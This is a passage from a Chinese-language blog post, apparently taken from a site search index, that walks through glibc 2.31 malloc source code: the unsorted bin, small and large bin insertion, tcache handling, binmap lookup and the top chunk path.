src="https://cata1oc.github.io/2022/07/16/%E5%A0%86%E5%9F%BA%E7%A1%8002-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/unsortedbin_part_4.png"></p><p>首先 check 一下链表的完整性，校验成功后，会将当前的 chunk 也就是 victim 从 unsorted bin 上面摘下来，方便后续操作</p><p>然后判断一下，如果 victim 的 size 刚好符合申请所需的 chunk 大小，那么先设置好标志位，然后：</p><ul><li>如果开启了 tcache（glibc2.31中默认开启），并且<strong>victim size 对应的 tc_idx 所在 bin 中仍有空余位置</strong>（少于7个），那么就调用<code>tcache_put()</code>将 victim 放入到 tcache 中，且将<strong>return_cached置为1</strong>，<strong>表示找到过符合大小的chunk</strong>且放入了tcache。</li><li>如果对应的这条 tcache bin 已经满了，那么就直接将其返回给用户</li></ul><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p><img src="https://cata1oc.github.io/2022/07/16/%E5%A0%86%E5%9F%BA%E7%A1%8002-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/unsortedbin_part_5.png"></p><p>这步是 unsorted bin 处理的核心，它会将 unsorted bin 中遍历的 chunk 根据 size 放入对应的 small bin 或者 large bin 中，这是唯一一次将 chunk 放入 small bin 或者 large bin 的过程。</p><p>如果 vicitim 的 size 位于 small bin：</p><ol><li>获取该 size 在 small bin 中的 index</li><li>bck等于index 所在 bin 的头指针</li><li>fwd等于头指针后的第一个 chunk 指针</li><li>使用头插法将 victim 插入到 bck 与 fwd 之间的位置，相当于末尾（图片右下角四行代码）</li></ol><p>否则，即 victim 的 size 位于 large bin 时：</p><ol><li><p>获取该 size 在 large bin 中的 index</p></li><li><p>获取该 index 所在 bin 的头指针作为 bck</p></li><li><p>获取头指针后的第一个 chunk 指针作为 fwd，<strong>这里的第一个 chunk 可以理解为这条 bin 链上 size 最大的 chunk之一</strong>，相当于下图的size为132的chunk。</p><p><img src="https://cata1oc.github.io/2022/07/16/%E5%A0%86%E5%9F%BA%E7%A1%8002-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/largebin_pic_2.png"></p></li></ol><p>接下来3833到3879内都是讨论chunk的大小，用来与bin中最大chunk和最小的chunk进行比较，主要用来设置large bin特有的fd_nextsize和bd_nextsize，bk和fd在最后统一设置。我采用和Cataloc师傅一样的讲述逻辑，不按照执行顺序来，这部分必须了解清楚large bin的结构是怎么样的才好理解。</p><ol><li><p><strong>fwd &#x3D;&#x3D; bck</strong></p><ul><li>这部分对应着3877-3878这两行，如果bin为空的话，直接设置victim的fd_nextsize 与 bk_nextsize成自己</li></ul></li><li><p><strong>fwd !&#x3D; bck 且 victim_size &lt; size（bck-&gt;bk）</strong></p><ul><li><p>这部分对应着3840-3849行，情况为chunk大小&lt;最小的chunk大小，为了方便，<strong>接下来我会用大fd和大bk来指代fd_nextsize和bd_nextsize</strong>。</p></li><li><p>可以看到这部分就是单纯在大fd、bk链条中插入了victim，我们只需要搞清这个位置在哪，以及如何进行查找的即可，位置不用多想，加进来一个最小的chunk肯定是在末尾，所以小bk和fd直接和前末尾chunk相连，而大fd和bk和最小的这群chunk的第一个相连。</p></li><li><p>首先看if中bck-&gt;bk查找到的chunk，是通过小bk找见的，所以是最小的chunk之一，且是这群chunk中的最后一个chunk。</p></li><li><p><code>fwd = bck</code>，<code>bck = bck-&gt;bk</code>， 现在fwd指向bin的头指针，bck为整条链的最后一个chunk（最后四行代码会将victim插入fwd和bck之间）。</p></li><li><p><code>victim-&gt;fd_nextsize = fwd-&gt;fd;</code> victim的<strong>大fd</strong>指向<strong>链表上第一个chunk</strong>（上图的第一个132大小的chunk）<br><code>victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</code>victim的<strong>大bk</strong>指向<strong>最小chun链表的第一个chunk</strong>(size为120chunk)</p></li><li><p><code>fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</code></p><p><strong>链表上第一个chunk的大bk</strong>和<strong>最小chun链表的第一个chunk的大fd</strong>都指向victim。</p></li></ul></li></ol><p>接下来3850到3858是通过wihle循环，通过大fd来从前往后，寻找第一个不大于victim_size的chunk，找到之后就判断等于和小于两种情况。</p><ol start="3"><li><p><strong>fwd !&#x3D; bck 且 victim_size &#x3D;&#x3D; fwd_size</strong></p><ul><li><p>对应3859-3862,很显然，如果存在该大小的chunk了，那就没必要设置大fd和bk，直接获取该大小chunk群的第二个chunk保存到fwd。</p></li><li><p>这里就注意，如果是插入已存在的chunk大小群，是放着这群chunk的第二个的位置，这也很好理解，放第一个还得设置大fd和bk，多此一举了。</p></li></ul></li><li><p><strong>fwd !&#x3D; bck 且 victim_size &gt; fwd_size</strong></p><ul><li><p>对应3864-3871行。</p></li><li><p>很明显victm的<strong>大fd</strong>指向<strong>这个第一个小于它本身的chunk</strong>（小c），<strong>大bk</strong>指向<strong>这个小c的大bk</strong>，也就是<strong>上一个大于小c的chunk群的第一个chunk</strong>。</p></li><li><p>检查一下<strong>链表完整性</strong></p></li><li><p><strong>小c的大bk</strong>指向<strong>victim</strong>，将<strong>victim的上个大chunk</strong>指向<strong>victim自己</strong>。</p></li></ul><p>这部分说起来很绕，但是自己去设计插入的角度理解，就很快能看懂了，建议把自己当作编写代码的人员，这部分你会怎么写。</p><p>3872-3875这部分，是属于3、4情况之后都会执行的，对bck赋值等于fwd-&gt;bk，方面最后四行代码的链表插入，将victim插入bck和fwd之间。且进行了一次<strong>链表完整性检查</strong>。</p></li></ol><p>最后的四行代码已经多次提到，主要说倒数第五行，<code>mark_bin()</code>主要标记该bin不为空，因为刚刚放进去了一个chunk，肯定不为空了。</p><h3 id="tcache处理"><a href="#tcache处理" class="headerlink" title="tcache处理"></a>tcache处理</h3><p><img src="https://cata1oc.github.io/2022/07/16/%E5%A0%86%E5%9F%BA%E7%A1%8002-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/unsortedbin_part_6.png"></p><p>这部分是整个部分的末尾。</p><p><strong>红色方框：</strong></p><ul><li><p>如果执行过上面<strong>分类</strong>的代码就会走到这里，所以必然没有将符合大小chunk放到tcache bin中，这样的话，tcache_unsorted_count就表示没放入tcache bin中的chunk的数目，进行+1。</p></li><li><p>如果之前把chunk放到过tcache bin（<strong>return_cached&#x3D;1</strong>），开启了<code>tcache_unsorted_limit</code>（默认是 0），且<code>tcache_unsorted_count</code>大于了<code>tcache_unsorted_limit</code> 的值，就会调用 <code>tcache_get()</code>从 tcache bin 中取出符合需求的 chunk 返回给用户。（这部分一般不执行）</p></li></ul><p><strong>绿色方框：</strong></p><p>注意这部分有个大括号，闭合了前面的 while 循环，<strong>最多遍历 unsorted bin 一万次</strong>。不然一次产生了太多的 unsorted bin，然后我 malloc 一次，结果一直在这个循环里分配 unsorted bin 上面的 chunk，迟迟等不到分配的内存，所以这里会设定一个遍历的最大值</p><p><strong>蓝色方框</strong>：</p><p>最后，出了 while 循环，也就遍历完 unsorted bin 了，这时会判断一下在先前遍历时是否找到符合需求的 chunk，若找到了且被放入了 tcache bin 中，则 return_cached 会被设置，此时调用<code>tcache_get()</code>即可。至此，unsorted bin 的处理逻辑就全部结束了。若仍未找到合适的 chunk，则会继续往后执行。</p><h2 id="Large-Bin-处理流程"><a href="#Large-Bin-处理流程" class="headerlink" title="Large Bin 处理流程"></a>Large Bin 处理流程</h2><h3 id="通过idx寻找"><a href="#通过idx寻找" class="headerlink" title="通过idx寻找"></a>通过idx寻找</h3><p><img src="https://cata1oc.github.io/2022/07/16/%E5%A0%86%E5%9F%BA%E7%A1%8002-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/largebin_part_1.png"></p><p><strong>第一层校验</strong>会判断所需的 chunk 大小 nb 是否位于 small bin 范围内，这里再判断一遍的原因是 <code>bin_at</code>这个宏是根据 size 获取在 bins 中的 idx 的，<a href="https://cata1oc.github.io/2022/06/30/%E5%A0%86%E5%9F%BA%E7%A1%8001-ptmalloc2%E5%88%9D%E6%8E%A2/">前一篇</a>我们提到，bins 中包含了 unsorted bin，small bin 以及 large bin。这里又判断一次范围是否在 small bin 也是为了确保，<code>bin_at</code> 的结果会落在 large bin 在 bins 对应的 idx 范围内</p><p><strong>第二层校验</strong>是确保 large bin 不为空，且 large bin 中最大的 chunk 要比所需的 chunk 要大。<code>first</code>宏用于获取 idx 所在 bin 中第一个 chunk，即当前 idx 中最大的 chunk赋值给victim。</p><p>接下来开始在 large bin 中寻找到最合适的那个 chunk，逻辑如下：</p><ol><li>与插入 chunk 到 large bin 中不同，这里是从最小的 chunk 开始遍历，直到找到一个 chunk 大于等于所需的 chunk 大小</li><li>这里有两处判断，第二处<strong>用来确保 victim 所在的相同大小的双链上至少有两个 chunk</strong>，这样我们方便把第二个 chunk，也就是 victim-&gt;fd 给分配出去。<code>victim != last(bin)</code>主要是判断该链上是否就只有一个 chunk。</li><li>如果这条链上存在至少 2 个 chunk，那就取第 2 个，否则就用第 1 个。然后调用<code>unlink_chunk()</code>将这个 chunk 断链，并判断切去所需大小 nb 后，余下空间是否构成一个最小 chunk：<ul><li>若不能，则对这个 chunk 设置并检查相应的标志位后，返回给用户</li><li>若能，则会切割出 nb 大小的部分，余下的部分作为 remainder 链入到 unsorted bin 中并根据大小决定是否设置 bk_nextsize &#x2F; fd_nextsize，并对 remainder 与分割出的部分分别设置标志位，将分割出的部分返回给用户。<strong>此处分割剩下的 remainder，并没有被设置为该分配区的 last remainder chunk。分析到这里为止，仅在 unsorted bin 处理逻辑中的一次分割会设置 last remainder chunk，这点需要注意</strong>。</li></ul></li></ol><h3 id="通过binmap寻找"><a href="#通过binmap寻找" class="headerlink" title="通过binmap寻找"></a>通过binmap寻找</h3><p><img src="https://cata1oc.github.io/2022/07/16/%E5%A0%86%E5%9F%BA%E7%A1%8002-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/largebin_part_2.png"></p><ul><li><p><code>++idx</code>：在前一个 bins[idx] 所表示的 large bin 中没有找到合适的块，那么就增加 idx 的值，去 bins[idx++] 去找是否有符合的块。当然，理论上 bins[idx++] 中只要存在 chunk，就一定可以满足需求</p></li><li><p><code>bin_at</code>：这个宏之前已经多次出现，就是<strong>拿到这个 idx 在 bins 对应的链表的头节点</strong>，这个头节点是一个 malloc_chunk 结构体，通过头节点的 fd&#x2F;bk 指针可以访问这个 bin 上的第一个块（对应 large bin 中最大的块）与最后一块（对应 large bin 中最小的块）</p></li><li><p>接下来 3 行相互之间有所关联，需要放在一起来看：</p><ul><li><p>首先 block，map，bit 这三个变量都是 unsigned int 类型</p></li><li><p>malloc_state 结构中有一个 binmap，它用来快速查找对应 index 所在的 bin 是否为空。这里通过 av-&gt;binmap 来访问</p></li><li><p>binmap 是个数组，长度为 4，每个元素都是一个 32 位的整数，加起来刚好是 128 位，刚好对应 bins 中的每个 bin，这 128 位可以看作是下标，若该下标的值置0，则说明 bin 为空</p></li><li><p><code>idx2block</code> 这个宏的操作是将 idx 右移 5位，即将 idx 除 32，得到一个位于 0~3 范围内的值，从而找到该下标位于 binmap 中的第几个 32 位的整数上</p></li><li><p><code>idx2bit</code> 作用是取到 idx 对应 large bin 的下标</p><p><img src="https://cata1oc.github.io/2022/07/16/%E5%A0%86%E5%9F%BA%E7%A1%8002-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/idx2bit.png"></p></li></ul></li></ul><h3 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h3><p>该循环持续到large bin处理的结尾，这里分两部分讲解。</p><p><img src="https://cata1oc.github.io/2022/07/16/%E5%A0%86%E5%9F%BA%E7%A1%8002-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/largebin_part_3.png"></p><ul><li><p>if 语句有两个条件：</p><ul><li><p>bit &gt; map：如果bit大于map说明在本block中，该map32位中，高于bit位的位置都为0，表示对应的bin都为空，无需继续检查</p></li><li><p>bit &#x3D;&#x3D; 0：通过idx2bit转化为32位的数据中，应该是31个0和一个1组成的，所以bit!&#x3D;0；</p></li></ul></li><li><p>然后进入循环，判断当前 block 的值是否为 0，即这个 block 所表示的 32 个 bin 是否都是空的，如果是空的，就找下一个 block。如果全部都为空，就跳转到后面的 use_top 中进行处理。如果不为空，那么找到该block对应的第一个bin并将 bit 置 1（0···01表示该block的第一个bin）。</p></li><li><p>while 循环里通过 bit 与 map 相与是否为 0 来判断这个 bin 是否为空。若为空，则通过<code>next_bin</code>来访问下一个 bin，这里的下一个可以理解为 <code>bins[80] -&gt; bins[81]</code> 这种形式，同时 bit 也进行左移，即移动到这个 block 里面与表示这个 bin 所在位置的下标处。</p></li><li><p>此时这个 bin 应该不是空的，但还是要判断一下。通过 <code>last</code> 获取到 bin 中的第一个元素，判断是否与自身相等，若相等，则说明 bin 为空，那么将这个 bin 在 binmap 中对应的 bit 置零，然后继续查看下一个 bin</p></li></ul><p><img src="https://cata1oc.github.io/2022/07/16/%E5%A0%86%E5%9F%BA%E7%A1%8002-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/largebin_part_4.png"></p><ul><li><p>若不为空，直接使用victim进行分割，因为上面赋值的是last(bin)，也就上该bin上最小的chunk。</p></li><li><p>接下来的操作就和 unsorted bin 里面满足 4 个条件的那个操作，以及前面在一开始就可以找到一个合适的 large bin chunk 时的操作是类似的。就是先切割，挂到 unsorted bin 中，返回给用户这么几个操作，这里就不多赘述了。</p></li><li><p>唯一需要注意的是，<strong>若所需的 chunk 位于 small bin 的范围</strong>（在large bin处理的开头判断过一次，范围只持续在第一部分——通过idx寻找），<strong>那么这里分割后的 remainder 会被设置为 last remainder chunk。这是第二次设置 last remainder chunk 的地方。</strong></p></li></ul><h2 id="Top-Chunk-处理流程"><a href="#Top-Chunk-处理流程" class="headerlink" title="Top Chunk 处理流程"></a>Top Chunk 处理流程</h2><p><img src="https://fastly.jsdelivr.net/gh/DETALA/images@main/pwn/malloc&free/1680534109697use_top.png"></p><ul><li>先通过 av-&gt;top 获取到 top chunk，通过宏 <code>chunksize</code> 获取到 top chunk 的大小。然后先做一个判断，看这个 top chunk 的 size 是否超过了 av-&gt;system_mem（这个值表示系统调用时申请的内存大小）。这个判断在 unsorted bin 的处理流程开始处也进行过一次</li><li>接下来，则根据 top chunk 的情况分类处理：<ul><li>如果 top chunk 超过 nb（所需 chunk 大小） + MINSIZE，那么操作和前面 unsorted bin 与 large bin 分割类似。<strong>此处分割不会设置 last remainder chunk</strong></li><li>否则，如果存在 fastbin，那么先调用 <code>malloc_consolidate()</code> 将 fastbin 合并；再根据所需的 chunk 大小设置 idx 的值，然后回到死循环的开头（图中紫色大括号，对应 unsorted bin 处理流程的开始部分）再进行一轮判断</li><li>若上面俩都没执行，那么调用 <code>sysmalloc()</code> 通过系统调用来进行内存分配，这部分可参考<a href="https://www.cnblogs.com/luoleqi/p/15520621.html#sysmalloc-internal_size_t-nb-mstate-av">Pwnki</a>的分析</li></ul></li></ul><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><p>[堆基础02：malloc源码分析](<a href="https://cata1oc.github.io/2022/07/16/%E5%A0%86%E5%9F%BA%E7%A1%8002-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/">堆基础02：malloc源码分析 | cataLoc’s Blog</a>)</p></li><li><p>[glibc 2.31 malloc与free 源码分析](<a href="https://www.cnblogs.com/luoleqi/p/15520621.html#sysmalloc-internal_size_t-nb-mstate-av">glibc 2.31 malloc与free 源码分析（持续更新） - PwnKi - 博客园</a>)</p></li></ol>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
